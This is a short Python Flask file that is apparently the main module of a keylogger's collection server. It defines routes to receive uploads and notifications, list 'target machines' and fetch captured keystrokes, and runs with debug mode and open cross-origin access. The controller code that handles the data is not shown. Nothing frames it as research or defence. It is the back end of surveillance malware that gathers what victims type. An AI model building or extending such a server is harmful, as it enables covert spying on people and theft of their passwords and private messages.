from flask import Flask, request
from flask_cors import CORS
from backend import controllers, services, utils

app = Flask(__name__)
CORS(app)

@app.get("/")
def home():
    return "KeyLogger Server is Running"

@app.post("/api/notifications")
def notifications():
    return controllers.handle_notifications(request)

@app.post("/api/upload")
def upload():
    return controllers.handle_upload(request)

@app.get("/api/get_target_machines_list")
def get_machines():
    return controllers.handle_get_machines()

@app.get("/api/get_keystrokes")
def get_keystrokes():
    return controllers.handle_get_keystrokes(request)

if __name__ == "__main__":
    app.run(debug=True, port=5000)